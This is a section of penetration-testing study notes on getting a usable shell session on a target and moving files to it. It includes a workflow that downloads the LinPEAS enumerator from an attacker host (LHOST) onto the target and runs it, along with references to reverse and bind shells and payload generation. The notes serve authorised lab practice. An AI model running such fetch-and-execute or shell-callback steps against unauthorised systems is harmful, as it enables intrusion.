    4.2 Establish sessions and move files

    Strategy map | Master Notes | Operational index | Cheatsheets

    Delivery, execution, connection and a usable session are separate states. Select a connection direction and compatible interpreter before generating payloads; transfers must preserve bytes and destination permissions.

    Speedrun blocks: 7; transfers support 5–14. Documented methods: 12.

    Examples are hypothetical study material. Apply commands only to an assigned scope during the later practice phase. A method is enabled by its prerequisites; its presence here does not establish a vulnerability or practical mastery.

    4.2.1 First pass: tools and findings

    Use the branch matching the current host, identity and observed result. Tool output supplies leads; the linked procedure verifies and uses the exact condition.

    4.2.1.1 Verify the host and command identity

    A single response is not necessarily a stable session. Record the actual destination and output channel.

    hostname
id
pwd
ip addr
ip route
    • If Commands execute as the expected target identity: Choose the available callback direction and interpreter. → Connect a Linux reverse shell through an available interpreter.
    • If Callback cannot reach the listener: Inspect the actual initiator, destination and route. → Diagnose connection direction, listener and session failures in order.
    • Otherwise: Output cannot be attributed to the destination: repeat the host/identity proof. → Verify command execution, host and represented identity.

    4.2.1.2 Transfer a reviewed tool through a reachable route

    Serve from the attacker and download on the target only when that direction is reachable. Verify the received artifact.

    wget http://LHOST:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/linpeas.txt
    • If The verified Linux enumerator is present: Run the LinPEAS baseline and inspect its findings. → Use enumeration tools to generate manually testable candidates.
    • If HTTP is unavailable but SSH file access works: Use SCP instead of forcing the same failing transport. → Copy files through an authenticated SSH service.
    • If SMB is the usable authenticated channel: Use the SMB transfer procedure in that identity. → Move Windows files through an authenticated SMB share.
    • Otherwise: Bytes differ or the file is missing: fix transfer before interpreting execution errors. → Match an artifact to its executable consumer and runtime.

    4.2.2 Discovery workflow

    Start with a claimed effect, command primitive or accepted remote identity; a usable shell and return path remain unproved.

    Follow these observations into a method; the detailed recognition routes below show synthetic output and the checks still needed.

    1. Verify destination, execution identity and the actual output channel: Verify command execution, host and represented identity.
    2. Inspect interpreters and both connection directions before choosing reverse, bind or native access: Connect a Linux reverse shell through an available interpreter; Use a bind shell when the target can accept inbound connections; Use Windows authenticated access or a PowerShell command channel.
    3. Match artifact/handler and terminal requirements to the selected consumer: Generate a payload matching OS, process, format and handler; Repair a limited Linux terminal.
    4. Select a transfer route by available client, authentication and direction, then verify bytes: Transfer over HTTP using Linux or Windows clients; Copy files through an authenticated SSH service; Move Windows files through an authenticated SMB share; Move a small artifact through a text-only channel.

    Decision rule: an observed clue opens a candidate. Choose it only after the missing conditions are verified; a failed check rules out that context, while unavailable evidence stays inconclusive.

    4.2.3 Method families

    • Execution and connection direction: Verify command execution, host and represented identity, Connect a Linux reverse shell through an available interpreter, Use Windows authenticated access or a PowerShell command channel, Use a bind shell when the target can accept inbound connections.
    • Payload and terminal compatibility: Generate a payload matching OS, process, format and handler, Repair a limited Linux terminal.
    • File transport and integrity: Transfer over HTTP using Linux or Windows clients, Copy files through an authenticated SSH service, Move Windows files through an authenticated SMB share, Stream a file over a direct TCP connection, Move a small artifact through a text-only channel, Use a temporary FTP transfer as a constrained fallback.

    4.2.5 Verify command execution, host and represented identity

    4.2.5.1 Purpose and result

    A verified foothold state with host, identity, privilege and network context.

    4.2.5.2 Recognition clues

    A PoC, injected command or remote client reports execution.

    4.2.5.2.1 Find the clue from your starting access

    Where to investigate: Begin with the original command/PoC/client result and request a small host/identity proof through its existing output channel.

    Discovery action — reference example:

    Execution context, effects and stopping rule

    Host/access: Verified command execution or authenticated remote access and a known network path

    Requires: A functioning execution primitive and an observable output or controlled side effect

    Action class: May create sessions, execute commands or transfer files.

    Stop/verify: Save destination identity/hostname and actual command output; use Windows hostname/whoami/ipconfig when appropriate.

    Failure/next check: A hung request or success message does not prove execution. First establish a bounded observable effect, then diagnose the next state.

    4.2.5.5 Why it works

    Execution, connection and a usable session are different capabilities. A command-output path may be enough to enumerate before any interactive shell exists.
